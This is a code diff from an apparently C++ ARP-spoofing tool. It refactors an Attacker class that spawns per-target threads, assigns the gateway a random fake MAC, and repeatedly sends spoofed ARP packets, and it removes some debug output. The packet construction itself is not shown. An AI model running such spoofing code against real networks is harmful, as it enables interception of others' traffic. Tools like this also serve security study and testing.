@@ -10,9 +10,10 @@ typedef std::chrono::high_resolution_clock Clock;
 
 Attacker::Attacker(const uint32_t attack_interval_ms) : attack_interval_ms(attack_interval_ms) {}
 
-void Attacker::_attack(const Interface &interface, const Host &target, const Host &gateway) {
-    std::cerr << "_attack: " << interface.get_socket_fd() << "\n";
-    std::cerr << &interface << "\n";
+// FIXME
+// Cannot use const reference since we are referencing local variables created in Controller's attack method.
+// Try to find a way to avoid copying unnecessarily.
+void Attacker::_attack(const Interface interface, const Host target, const Host gateway) {
     unsigned char buffer[BUF_SIZE];
     struct sockaddr_ll socket_address = Arp::prepare_arp(
         buffer,
@@ -32,8 +33,6 @@ void Attacker::_attack(const Interface &interface, const Host &target, const Hos
         }
 
         if (sendto(interface.get_socket_fd(), buffer, 42, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1) {
-            std::cerr << interface.get_socket_fd() << "\n";
-            perror("sendto");
             std::cerr << "_spoof: Failed to send spoof packet.\n";
         }
 
@@ -42,13 +41,11 @@ void Attacker::_attack(const Interface &interface, const Host &target, const Hos
 }
 
 void Attacker::attack(const Interface &interface, const Host &target, const Host &gateway) {
-    std::cerr << "attacker: " << interface.get_socket_fd() << "\n";
-    std::cerr << &interface << "\n";
     if (fake_mac_address.find(gateway.get_ip()) == fake_mac_address.end()) {
         fake_mac_address[gateway.get_ip()] = Mac::get_random_mac_address();
     }
     Thread::spoofing_signal[target.get_ip()].store(true);
-    Thread::spoofing_thread[target.get_ip()] = std::thread(&Attacker::_attack, this, std::cref(interface), std::cref(target), std::cref(gateway));
+    Thread::spoofing_thread[target.get_ip()] = std::thread(&Attacker::_attack, this, interface, target, gateway);
 }
 
 void Attacker::recover(const Interface &interface, const Host &target, const Host &gateway) {
